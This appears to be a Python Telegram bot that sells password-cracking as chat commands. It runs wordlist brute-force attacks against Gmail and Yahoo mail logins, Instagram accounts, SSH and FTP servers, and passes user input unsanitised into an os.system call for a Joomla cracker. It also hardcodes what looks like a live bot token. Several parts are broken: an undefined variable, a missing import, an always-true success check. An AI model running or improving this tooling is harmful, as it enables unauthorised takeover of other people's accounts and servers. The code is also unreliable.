from telegram.ext import CommandHandler,Updater
import poplib, imaplib, smtplib
from imaplib import IMAP4
from poplib import POP3
import sys
import os
import time
import platform
import urllib
import requests
import paramiko
import ftplib

update = Updater("511416898:AAGqWX1H6cdC2rL9kajXDhszu-y50WJGEN8")



def start_method(bot , update):
    start += "=============================="
    start += "[*] Free Service [*]"
    start += "/gmail => crack gmail"
    start += "/ymail => crack yahoo-mail"
    start += "=============================="
    start += "[*] Social [*]"
    start += "/facebook  => crack facebook  ID"
    start += "/instagram => crack instagram ID"
    start += "/twitter   => crack twitter   ID"
    start += "=============================="
    start += "[*] SERVER [*]"
    start += "/ssh => crack ssh"
    start += "/ftp => crack ftp"
    start += "=============================="
    start += "[*] WEB [*]"
    start += "/joomla => crack joomla admin"
    start += "/wordpress => crack wordpress"
    start += "=============================="
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id,start)



def gmail_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "Enter The Valid Gmail :(ex: /gmail target@gmail.com) ")
    gmail_ = ''.join(args)
    passlist = 'email.txt'
    fileopen = open(passlist, "r")
    u = fileopen.readlines()
    smtp_host = 'smtp.gmail.com'
    smtp_port = 465
    session = smtplib.SMTP_SSL()
    session.connect(smtp_host, smtp_port)
    session.ehlo
    bot.sendMessage(chat_id, "[+] Start Cracking gmail ...")
    time.sleep(2)
    fileopen = open(passlist , 'r')
    for pass_file in fileopen:
        try:
            g = session.login(gmail_ , pass_file[:-1])
            if (g == (235 , '2.7.0 Accepted')):
                bot.sendMessage(chat_id ,"[+] PASSWORD FOUND [+] :"+pass_file)
                session.quit()
                fileopen.close()
                exit()

        except smtplib.SMTPAuthenticationError:
            continue        


def ymail_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "Enter The Valid Ymail : (ex:/ymail target@yahoo.com")
    yamil_ = ''.join(args)
    passlist = 'email.txt'
    fileopen = open(passlist, "r")
    u = fileopen.readlines()
    host = 'imap.mail.yahoo.com'
    port = 993
    bot.sendMessage(chat_id, "[+] Start cracking yahoo mail [+] ...")
    time.sleep(2)
    fileopen = open(passlist , 'r')
    for pass_file in fileopen:
        try:
            session = imaplib.IMAP4_SSL(host,port)
            y = session.login(yamil_, pass_file[:-1])
            if (y == 'OK' or 'AUTHENTICATE complete'):
                bot.sendMessage(chat_id, "[+] PASSWORD FOUND [+]"+pass_file)
                session.logout()
                fileopen.close()
                exit()
        except IMAP4.error:
            continue
    
def instagram_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "[] Enter Username = ")
    instauser = ''.join(args)
    class Instabrute():
        def __init__(self, username , passwordfile='instagram.txt'):
            self.username = username
            self.passwordfile =passwordfile
            self.IsUserExsits()

        def IsUserExsits(self):
            r = requests.get('https://www.instagram.com/%s/?__a=1' % self.username)
            if (r.status_code == 404):
                bot.sendMessage(chat_id,'[*] User named"%s"not found' % username)
            elif (r.status_code == 200):
                return True        

        def Login(self, password):
            sess = requests.Session()
            if len(self.CurrentProxy) >0:
                sess.proxies = {"http": self.CurrentProxy, "https": self.CurrentProxy}
            
            
            sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '', 's_network' : '', 'ds_user_id' : ''})
            sess.headers.update({
                'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
                'x-instagram-ajax':'1',
                'X-Requested-With': 'XMLHttpRequest',
                'origin': 'https://www.instagram.com',
                'ContentType' : 'application/x-www-form-urlencoded',
                'Connection': 'keep-alive',
                'Accept': '*/*',
                'Referer': 'https://www.instagram.com',
                'authority': 'www.instagram.com',
                'Host' : 'www.instagram.com',
                'Accept-Language' : 'en-US;q=0.6,en;q=0.4',
                'Accept-Encoding' : 'gzip, deflate'})


            r = sess.get('https://www.instagram.com/')

            sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

            data = json.loads(r.text)
            if (data['status'] == 'fail'):
                bot.sendMessage(chat_id, (data['message']))

            if (data['authenticated'] == True):
                return sess
            else:
                return False

    for password in instauser.passwords:
        sess = instauser.Login(password)
        if sess:
            bot.sendMessage(chat_id ,'[+] Access Granted [+] %s' % [instauser.username,password])
        else:
            bot.sendMessage(chat_id, '[*] Access Denied [*]')


def ssh_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id,"Usage : /ssh ip")
    host = ''.join(args)
    user = 'sshuser.txt'
    passlist = 'sshpass.txt'
    file = open(passlist, "r")
    s = paramiko.SSHClient();
    s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    s.load_system_host_keys();
    for pass_ in file.readlines():

        password = pass_.strip("\n")

        try:
            s.connect(host , port=22 , username=user , password=str(password), timeout=1, allow_agent=False , look_for_keys=False)
            bot.sendMessage(chat_id,"[+] Password Found [+]"+password)
            break
        except paramiko.AuthenticationException as e:
            bot.sendMessage(chat_id,"[*] Password invalid [*]");


def ftp_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "Usage : /ftp ip")
    u = ''.join(args)
    user = 'ftpuser.txt'
    passlist = 'ftppassword.txt'
    file = open(passlist, "r")
    for pass_ in file.readlines():
        password = pass_.strip("\n")
        try:
            f = ftplib.FTP(u)
            f.login(user , password)
            bot.sendMessage(chat_id, "[+] PASSWORD FOUND [+]"+password)
            f.quit()
        except ftplib.error_perm as e:
            bot.sendMessage(chat_id,"[*] Password invalid [*]")


def joomla_method(bot , update , args):
    chat_id = update.message.chat_id
    bot.sendMessage(chat_id, "Usage : /joomla --url example.com --user admin ")
    usage = ''.join(args)
    os.system("python joomla.py"+usage+"--dic joolma.txt")


start = CommandHandler("start", start_method)
update.dispatcher.add_handler(start)


gmail = CommandHandler("gmail", gmail_method, pass_args=True)
update.dispatcher.add_handler(gmail)


ymail = CommandHandler("ymail", ymail_method, pass_args=True)
update.dispatcher.add_handler(ymail)


instagram = CommandHandler("instagram", instagram_method, pass_args=True)
update.dispatcher.add_handler(instagram)


ssh = CommandHandler("ssh", ssh_method, pass_args=True)
update.dispatcher.add_handler(ssh)


ftp = CommandHandler("ftp", ftp_method, pass_args=True)
update.dispatcher.add_handler(ftp)


joomla = CommandHandler("joomla", joomla_method, pass_args=True)
update.dispatcher.add_handler(joomla)



update.start_polling()